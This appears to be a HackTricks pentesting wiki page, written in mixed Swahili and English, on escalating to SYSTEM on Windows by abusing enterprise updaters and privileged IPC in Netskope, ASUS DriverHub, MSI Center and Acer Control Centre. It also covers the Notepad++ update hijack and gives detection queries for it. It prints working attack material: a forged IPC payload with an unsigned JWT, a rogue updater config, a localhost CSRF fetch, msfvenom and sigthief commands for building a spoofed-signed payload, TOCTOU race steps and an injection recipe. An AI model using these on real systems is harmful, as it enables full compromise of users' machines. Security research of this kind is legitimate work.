# Kutumia Vibaya Auto-Updaters ya Enterprise na Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unatoa muhtasari wa aina ya chains za Windows local privilege escalation zinazopatikana katika agents na updaters za endpoint za enterprise zinazofungua uso wa IPC rahisi kutumia na mtiririko wa masasisho wenye mamlaka. Mfano unaoakisi ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji mwenye haki ndogo anaweza kulazimishwa kujiandikisha kwenye server inayoendeshwa na mshambuliaji kisha kukabidhi MSI hatari ambayo SERVICE ya SYSTEM inasakinisha.

Mafikirio muhimu unaweza kuyatumia dhidi ya bidhaa sawa:
- Tumia mbaya localhost IPC ya huduma yenye mamlaka ili kulazimisha kujiandikisha upya au kurekebisha usanidi kwa server ya mshambuliaji.
- Tekeleza endpoints za update za vendor, sambaza rogue Trusted Root CA, na elekeza updater kwa kifurushi chafu chenye “signed”.
- Epuka ukaguzi dhaifu wa signer (CN allow-lists), optional digest flags, na mali za MSI zisizokuwa kali.
- Iki IPC ime “encrypted”, pata key/IV kutoka kwa vitambulisho vya mashine vinavyosomwa na wote vilivyohifadhiwa kwenye registry.
- Iki huduma inapiga vikwazo vya wito kwa image path/process name, injekta katika process iliyo kwenye allow-list au anzisha moja ikiwa suspended na bootstrap DLL yako kupitia patch ndogo ya thread-context.

---
## 1) Kulazimisha kujiandikisha kwa server ya mshambuliaji kupitia localhost IPC

Wakala wengi huleta process ya UI ya user-mode inayozungumza na SYSTEM service kupitia localhost TCP kwa kutumia JSON.

Imeonekana katika Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Mtiririko wa exploit:
1) Tunga token ya JWT ya enrollment ambayo claims zake zinadhibiti backend host (mfano, AddonUrl). Tumia alg=None ili sulema ya sahihi isihitajike.
2) Tuma ujumbe wa IPC unaochochea amri ya provisioning ukiwa na JWT yako na jina la tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Huduma inaanza kuwasiliana na server yako ya rogue kwa ajili ya enrollment/config, mfano:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Ikiwa caller verification inategemea path/jina, tengeneza ombi kutoka kwa binary ya vendor iliyoorodheshwa kwenye allow-list (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Rejesha PEM CA certificate. Huduma inaisakinisha kwenye Local Machine Trusted Root store.  
3) /v2/checkupdate → Toa metadata inayoelekeza kwa MSI mbaya na toleo bandia.

Bypassing common checks seen in the wild:
- Signer CN allow-list: huduma inaweza tu kuangalia kwamba Subject CN ni sawa na “netSkope Inc” au “Netskope, Inc.”. Rogue CA yako inaweza kutoa leaf yenye CN hiyo na kusaini MSI.
- CERT_DIGEST property: jumuisha mali ya MSI isiyo hatari yenye jina CERT_DIGEST. Hakuna utekelezaji wakati wa usakinishaji.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) inazima uthibitishaji wa ziada wa kriptografia.

Result: huduma ya SYSTEM inasakinisha MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
ikitekeleza arbitrary code kama NT AUTHORITY\SYSTEM.

---
## 3) Kutengeneza maombi ya IPC yaliyofichwa (wanapokuwepo)

From R127, Netskope ilifunga IPC JSON ndani ya uwanja encryptData unaoonekana kama Base64. Reversing ilionyesha AES na key/IV zinazoondolewa kutoka kwa thamani za registry zinazoweza kusomwa na mtumiaji yeyote:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Wavamizi wanaweza kuiga encryption na kutuma valid encrypted commands kutoka kwa mtumiaji wa kawaida. Ushauri wa jumla: ikiwa agent ghafla “encrypts” IPC yake, tazama device IDs, product GUIDs, install IDs chini ya HKLM kama material.

---
## 4) Kupitia orodha za ruhusa za waombaji wa IPC (ukaguzi wa path/jina)

Baadhi ya huduma hujaribu authenticate peer kwa kutatua PID ya muunganisho wa TCP na kulinganisha image path/name dhidi ya vendor binaries zilizoorodheshwa chini ya Program Files (mf., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) na proxy IPC kutoka ndani yake.
- Spawn an allow-listed binary suspended na bootstrap proxy DLL yako bila CreateRemoteThread (see §5) ili kutimiza driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products mara nyingi zinaambatanisha minifilter/OB callbacks driver (mf., Stadrv) ili kuondoa haki hatarishi kutoka kwa handles za protected processes:
- Process: huondoa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: hupunguza mpaka THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Loader wa user-mode wa kuaminika unaoheshimu vizingiti hivi:
1) CreateProcess ya vendor binary kwa CREATE_SUSPENDED.
2) Pata handles ambazo bado una ruhusa: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwenye process, na thread handle na THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au THREAD_RESUME tu ikiwa unapata patch code kwenye RIP inayojulikana).
3) Andika tena ntdll!NtContinue (au thunk nyingine ya mapangwa mapema) kwa stub ndogo inayoitwa LoadLibraryW kwa path ya DLL yako, kisha irudi.
4) ResumeThread ili kusababisha stub yako in-process, ikipakia DLL yako.

Kwa sababu haukutumia PROCESS_CREATE_THREAD au PROCESS_SUSPEND_RESUME kwenye process ambayo tayari ilikuwa ilindwa (uliunda mwenyewe), sera ya driver inatimizwa.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) hufanya kiotomatiki rogue CA, kusaini MSI mbaya, na hutumikia endpoints zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ni custom IPC client inayotengeneza arbitrary (hiari kwa AES-encrypted) IPC messages na inajumuisha suspended-process injection ili itoke kutoka kwa binary iliyoorodheshwa.

---
## 1) Browser-to-localhost CSRF dhidi ya HTTP APIs zenye ruhusa (ASUS DriverHub)

DriverHub inapeleka user-mode HTTP service (ADU.exe) kwenye 127.0.0.1:53000 inayotarajia simu kutoka browser zinazoja kutoka https://driverhub.asus.com. Filter ya origin inafanya tu `string_contains(".asus.com")` kwenye Origin header na kwenye download URLs zilizoonyeshwa na `/asus/v1.0/*`. Hivyo host yoyote inayodhibitiwa na mwizi kama `https://driverhub.asus.com.attacker.tld` inapita ukaguzi na inaweza kutuma state-changing requests kutoka JavaScript. Angalia [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa mifano zaidi ya bypass patterns.

Mtiririko wa vitendo:
1) Sajili domain inayojumuisha `.asus.com` na mwenyeji ukurasa wa wavuti mbaya huko.
2) Tumia `fetch` au XHR kupiga privileged endpoint (mf., `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma JSON body inayotarajiwa na handler – frontend JS iliyopakiwa inaonyesha schema hapa chini.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Hata PowerShell CLI iliyoonyeshwa hapa chini inafanikiwa wakati Origin header ime-spoofed kwa thamani iliyoaminika:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Kila kutembelea tovuti ya mshambulizi kwa hivyo kunakuwa CSRF ya ndani ya 1-click (au 0-click kupitia `onload`) ambayo inaendesha SYSTEM helper.

---
## 2) Uthibitishaji wa code-signing usio salama & kunakili vyeti (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` inapakua executables yoyote zilizoainishwa kwenye body ya JSON na kuzihifadhi cache katika `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Uthibitishaji wa Download URL unarejelea mantiki ile ile ya substring, hivyo `http://updates.asus.com.attacker.tld:8000/payload.exe` inakubaliwa. Baada ya download, ADU.exe inakagua tu kwamba PE ina signature na kwamba Subject string inalingana na ASUS kabla ya kuikimbiza – hakuna `WinVerifyTrust`, hakuna uthibitishaji wa chain.

Ili kuiweka kama silaha:
1) Tengeneza payload (mfano, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Nakili signer wa ASUS ndani yake (mfano, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Weka `pwn.exe` kwenye domain inayofanana na `.asus.com` na chochea UpdateApp kupitia browser CSRF iliyotajwa hapo juu.

Kwa kuwa vigezo vya Origin na URL vinatumia substring na ukaguzi wa signer unalinganisha tu strings, DriverHub huvuta na kuendesha binary ya mshambulizi chini ya context yake iliyoingezwa ruhusa.

---
## 1) TOCTOU ndani ya njia za updater copy/execute (MSI Center CMD_AutoUpdateSDK)

SERVICE ya SYSTEM ya MSI Center inafichua protocol ya TCP ambapo kila frame ni `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Component kuu (Component ID `0f 27 00 00`) inaleta `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Handler yake:
1) Inachoma executable iliyotolewa hadi `C:\Windows\Temp\MSI Center SDK.exe`.
2) Inathibitisha signature kupitia `CS_CommonAPI.EX_CA::Verify` (certificate subject lazima iwe sawa na “MICRO-STAR INTERNATIONAL CO., LTD.” na `WinVerifyTrust` inapaswa kufanikiwa).
3) Inaunda scheduled task inayokimbiza faili ya temp kama SYSTEM na argumentos zinazodhibitiwa na mshambulizi.

Faili iliyokopiwa haifungiwi kati ya uthibitishaji na `ExecuteTask()`. Mshambulizi anaweza:
- Tuma Frame A ikielekeza kwenye binary halali iliyo saini ya MSI (inahakikisha uchunguzi wa signature upita na task inawekwa kwenye queue).
- Mpige rush kwa kutuma Frame B zenye mfululizo zikielekeza kwenye payload yenye madhara, zikibadilisha `MSI Center SDK.exe` mara tu baada ya uthibitishaji kumalizika.

Wakati scheduler itakapoanza, itaendesha payload iliyobadilishwa chini ya SYSTEM licha ya kuthibitisha faili asili. Utekelezaji thabiti hutumia goroutines/threads mbili zinazopiga spamu CMD_AutoUpdateSDK hadi dirisha la TOCTOU lipatikane.

---
## 2) Kutumia vibaya IPC za kiwango cha SYSTEM za desturi & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Kila plugin/DLL inayopakiwa na `MSI.CentralServer.exe` hupata Component ID iliyohifadhiwa chini ya `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Bytes 4 za kwanza za frame zinachagua component hiyo, zikiruhusu mashambulizi kupitisha amri kwa modules yoyote.
- Plugins zinaweza kufafanua task runners zao wenyewe. `Support\API_Support.dll` inafichua `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` na inaita moja kwa moja `API_Support.EX_Task::ExecuteTask()` bila **no signature validation** – mtumiaji yeyote wa ndani anaweza kuiweka `C:\Users\<user>\Desktop\payload.exe` na kupata utekelezaji wa SYSTEM kwa uhakika.
- Kuchukua mtiririko wa loopback kwa Wireshark au kuingilia binaries za .NET kwa dnSpy kunaonyesha haraka mapping ya Component ↔ command; wateja wa desturi wa Go/ Python wanaweza kisha kureplay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) inafichua `\\.\pipe\treadstone_service_LightMode`, na ACL yake ya discretionary inaruhusu wateja wa mbali (mfano, `\\TARGET\pipe\treadstone_service_LightMode`). Kutuma command ID `7` pamoja na path ya faili kunaanzisha utaratibu wa kuanzisha mchakato wa service.
- Maktaba ya client inaserializa magic terminator byte (113) pamoja na args. Instrumentation ya muda kwa Frida/`TsDotNetLib` (angalia [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) kwa vidokezo vya instrumentation) inaonyesha handler asilia inaweka thamani hii kwenye `SECURITY_IMPERSONATION_LEVEL` na integrity SID kabla ya kuita `CreateProcessAsUser`.
- Kubadilisha 113 (`0x71`) kwa 114 (`0x72`) huingia tawi la generic linalohifadhi token kamili ya SYSTEM na kuweka SID ya high-integrity (`S-1-16-12288`). Binary iliyozaliwa hivyo inakimbia kama SYSTEM isiyo na vikwazo, siaarifiwa ndani ya mashine au cross-machine.
- Changanya hilo na flag ya installer iliyofichuliwa (`Setup.exe -nocheck`) ili kuifanya ACC ionekane hata kwenye VMs za maabara na kufanya mazoezi ya pipe bila vifaa vya muuzaji.

Mende hizi za IPC zinaonyesha kwa nini huduma za localhost lazima zitekeleze mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) na kwa nini kila module yenye “run arbitrary binary” helper lazima ishirikiane na ukaguzi ule ule wa signers.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

WinGUp-based Notepad++ updaters za zamani hazikuweka wazi uthibitisho wa uhalisi wa updates. Wakati washambulizi walipodanisha provider ya hosting ya update server, wangeweza kuharibu XML manifest na kuelekeza wateja walioteuliwa pekee kwenye URLs za mshambulizi. Kwa kuwa client ilikubali majibu yoyote ya HTTPS bila kulazimisha mnyororo wa vyeti unaoaminika na signature halali ya PE, waathirika walipakua na kuendesha NSIS `update.exe` iliyotrojaniwa.

Mtiririko wa uendeshaji (hakuna exploit ya ndani inahitajika):
1. Infrastructure interception: danilisha CDN/hosting na jibu checks za update kwa metadata ya mshambulizi inayowelekeza kwenye URL ya kupakua yenye madhara.
2. Trojanized NSIS: installer inapakua/kuendesha payload na kutumia minyororo miwili ya utekelezaji:
- Bring-your-own signed binary + sideload: pakia Bitdefender iliyosainiwa `BluetoothService.exe` na weka `log.dll` yenye madhara kwenye search path yake. Wakati binary iliyosainiwa inakimbia, Windows inamsideload `log.dll`, ambayo inafungua na kuipakia kwa reflectively backdoor ya Chrysalis (Warbird-protected + API hashing ili kuzuia detection ya static).
- Scripted shellcode injection: NSIS inatekeleza script ya Lua iliyokusanywa inayotumia Win32 APIs (mfano, `EnumWindowStationsW`) ili kuingiza shellcode na ku-stage Cobalt Strike Beacon.

Mafundisho ya hardening/detection kwa updater yoyote:
- Lazimisha **certificate + signature verification** ya installer iliyopakuliwa (pin signer wa vendor, reject mismatched CN/chain) na saini pia manifest ya update (mfano, XMLDSig). Zuia redirects zinazosimamiwa na manifest isipothibitishwa.
- Tchukulia **BYO signed binary sideloading** kama pivot ya utambuzi baada ya kupakua: onyo pale binary iliyo saini ya vendor inapakia DLL jina kutoka nje ya canonical install path yake (mfano, Bitdefender ikipakia `log.dll` kutoka Temp/Downloads) na pale updater anapoacha/kuendesha installers kutoka temp zenye signatures zisizo za vendor.
- Fuata alama za kifungu za malware zilizoonekana katika mnyororo huu (zininufaika kama pivots za jumla): mutex `Global\Jdhfv_1.0.1`, uandishi wa `gup.exe` usio wa kawaida kwa `%TEMP%`, na hatua za injection za shellcode zinazosimamiwa na Lua.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ikianzisha msakinishaji usio wa Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Mitindo hii inatumika kwa updater yoyote unaokubali unsigned manifests au kushindwa pin installer signers—network hijack + malicious installer + BYO-signed sideloading husababisha remote code execution kwa kificho cha “trusted” updates.

---
## Marejeo
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
